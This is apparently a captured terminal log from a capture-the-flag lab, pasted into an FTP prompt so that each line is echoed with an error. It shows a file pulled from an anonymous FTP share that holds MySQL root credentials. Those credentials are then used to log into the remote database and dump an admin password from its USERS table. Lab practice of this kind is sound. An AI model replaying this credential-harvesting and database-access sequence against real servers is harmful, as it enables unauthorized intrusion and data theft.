@@ -1,0 +1,201 @@
+ftp> 200 PORT command successful. Consider using PASV.
+?Invalid command
+ftp> 150 Here comes the directory listing.
+?Invalid command
+ftp> -rwxrwxrwx    1 0        0              39 Dec 10  2019 file.txt
+?Invalid command
+ftp> drwxr-xr-x    2 0        0               6 Nov 04  2019 pub
+?Invalid command
+ftp> d-wx-wx--x    2 14       50              6 Nov 04  2019 uploads
+?Invalid command
+ftp> -rw-r--r--    1 0        0             224 Nov 04  2019 welcome.msg
+?Invalid command
+ftp> 226 Directory send OK.
+?Invalid command
+ftp> ftp> get file.txt
+?Invalid command
+ftp> local: file.txt remote: file.txt
+?Invalid command
+ftp> 200 PORT command successful. Consider using PASV.
+?Invalid command
+ftp> 150 Opening BINARY mode data connection for file.txt (39 bytes).
+?Invalid command
+ftp> 226 Transfer complete.
+?Invalid command
+ftp> 39 bytes received in 0.00 secs (392.6385 kB/s)
+?Invalid command
+ftp> ftp> cat file.txt
+?Invalid command
+ftp> ?Invalid command
+?Invalid command
+ftp> ftp> show file.txt
+?Invalid command
+ftp> ?Invalid command
+?Invalid command
+ftp> ftp> ls
+?Invalid command
+ftp> 200 PORT command successful. Consider using PASV.
+?Invalid command
+ftp> 150 Here comes the directory listing.
+?Invalid command
+ftp> -rwxrwxrwx    1 0        0              39 Dec 10  2019 file.txt
+?Invalid command
+ftp> drwxr-xr-x    2 0        0               6 Nov 04  2019 pub
+?Invalid command
+ftp> d-wx-wx--x    2 14       50              6 Nov 04  2019 uploads
+?Invalid command
+ftp> -rw-r--r--    1 0        0             224 Nov 04  2019 welcome.msg
+?Invalid command
+ftp> 226 Directory send OK.
+?Invalid command
+ftp> ftp> sir
+?Invalid command
+ftp> ?Invalid command
+?Invalid command
+ftp> ftp> dir
+?Invalid command
+ftp> 200 PORT command successful. Consider using PASV.
+?Invalid command
+ftp> 150 Here comes the directory listing.
+?Invalid command
+ftp> -rwxrwxrwx    1 0        0              39 Dec 10  2019 file.txt
+?Invalid command
+ftp> drwxr-xr-x    2 0        0               6 Nov 04  2019 pub
+?Invalid command
+ftp> d-wx-wx--x    2 14       50              6 Nov 04  2019 uploads
+?Invalid command
+ftp> -rw-r--r--    1 0        0             224 Nov 04  2019 welcome.msg
+?Invalid command
+ftp> 226 Directory send OK.
+?Invalid command
+ftp> ftp> dir file.txt
+?Invalid command
+ftp> 200 PORT command successful. Consider using PASV.
+?Invalid command
+ftp> 150 Here comes the directory listing.
+?Invalid command
+ftp> -rwxrwxrwx    1 0        0              39 Dec 10  2019 file.txt
+?Invalid command
+ftp> 226 Directory send OK.
+?Invalid command
+ftp> ftp> quit
+?Invalid command
+ftp> 421 Timeout.
+?Invalid command
+ftp> ┌─[root@parrot]─[/home/kevin/THM/ADV of cyber/DAY11]
+?Invalid command
+ftp> └──╼ #ls
+?Invalid command
+ftp> file.txt
+?Invalid command
+ftp> ┌─[root@parrot]─[/home/kevin/THM/ADV of cyber/DAY11]
+?Invalid command
+ftp> └──╼ #cat file.txt
+?Invalid command
+ftp> remember to wipe mysql:
+?Invalid command
+ftp> root
+?Invalid command
+ftp> ff912ABD*
+?Invalid command
+ftp> ┌─[root@parrot]─[/home/kevin/THM/ADV of cyber/DAY11]
+?Invalid command
+ftp> └──╼ #mysql -h 10.10.44.198 -u root -p
+?Invalid command
+ftp> Enter password: 
+?Invalid command
+ftp> Welcome to the MariaDB monitor.  Commands end with ; or \g.
+?Invalid command
+ftp> Your MySQL connection id is 9
+?Invalid command
+ftp> Server version: 5.7.28 MySQL Community Server (GPL)
+?Invalid command
+ftp> 
+ftp> Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+?Invalid command
+ftp> 
+ftp> Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+?Invalid command
+ftp> 
+ftp> MySQL [(none)]> show databases;
+?Invalid command
+ftp> +--------------------+
+?Invalid command
+ftp> | Database           |
+?Invalid command
+ftp> +--------------------+
+?Invalid command
+ftp> | information_schema |
+?Invalid command
+ftp> | data               |
+?Invalid command
+ftp> | mysql              |
+?Invalid command
+ftp> | performance_schema |
+?Invalid command
+ftp> | sys                |
+?Invalid command
+ftp> +--------------------+
+?Invalid command
+ftp> 5 rows in set (0.501 sec)
+?Invalid command
+ftp> 
+ftp> MySQL [(none)]> use data
+?Invalid command
+ftp> Reading table information for completion of table and column names
+?Invalid command
+ftp> You can turn off this feature to get a quicker startup with -A
+?Invalid command
+ftp> 
+ftp> Database changed
+?Invalid command
+ftp> MySQL [data]> show tables
+?Invalid command
+ftp>     -> 
+?Invalid command
+ftp>     -> ;
+?Invalid command
+ftp> +----------------+
+?Invalid command
+ftp> | Tables_in_data |
+?Invalid command
+ftp> +----------------+
+?Invalid command
+ftp> | USERS          |
+?Invalid command
+ftp> +----------------+
+?Invalid command
+ftp> 1 row in set (0.327 sec)
+?Invalid command
+ftp> 
+ftp> MySQL [data]> select * from USERS
+?Invalid command
+ftp>     -> ;
+?Invalid command
+ftp> +-------+--------------+
+?Invalid command
+ftp> | name  | password     |
+?Invalid command
+ftp> +-------+--------------+
+?Invalid command
+ftp> | admin | bestpassword |
+?Invalid command
+ftp> +-------+--------------+
+?Invalid command
+ftp> 1 row in set (0.309 sec)
+?Invalid command
+ftp> ^C
+ftp> 
+ftp> 
+ftp> 
+ftp> 
+ftp> ^C
+ftp> ^C
+ftp> ^C
+ftp> cdssdsdvs
+?Invalid command
+ftp> 
+ftp> 
+ftp> 
+ftp> 
+ftp> 
